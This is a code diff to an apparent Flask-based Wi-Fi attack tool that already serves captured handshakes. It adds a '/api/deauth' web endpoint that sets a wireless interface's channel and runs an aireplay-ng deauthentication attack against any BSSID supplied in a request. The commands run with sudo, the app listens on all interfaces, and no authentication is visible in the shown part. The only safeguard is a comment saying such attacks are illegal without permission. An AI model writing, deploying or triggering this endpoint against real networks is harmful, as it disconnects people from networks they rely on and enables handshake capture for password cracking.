@@ -678,6 +678,29 @@ def api_download_handshake(fname):
     return send_file(fname, as_attachment=True)
 
 
+@app.post("/api/deauth")
+def api_deauth():
+    data = request.get_json(force=True, silent=True) or {}
+    bssid = data.get("bssid")
+    channel = data.get("channel")
+    if not bssid or not channel:
+        return jsonify({"error": "Missing BSSID or channel"}), 400
+    # WARNING: Deauth attacks are illegal on networks you do not own or have permission to test!
+    # Set wlan1 to the correct channel
+    try:
+        subprocess.run(["sudo", "iwconfig", "wlan1", "channel", str(channel)], check=True)
+    except Exception as e:
+        return jsonify({"error": f"Failed to set channel: {e}"}), 500
+    # Run aireplay-ng deauth attack (10 packets as a demo, can be increased)
+    try:
+        result = subprocess.run([
+            "sudo", "aireplay-ng", "--deauth", "10", "-a", bssid, "wlan1"
+        ], capture_output=True, text=True, timeout=10)
+        return jsonify({"status": "sent", "stdout": result.stdout, "stderr": result.stderr})
+    except Exception as e:
+        return jsonify({"error": f"Failed to run aireplay-ng: {e}"}), 500
+
+
 if __name__ == "__main__":
     # Listen on all interfaces so you can view from other devices too.
     app.run(host="0.0.0.0", port=8080, debug=False)
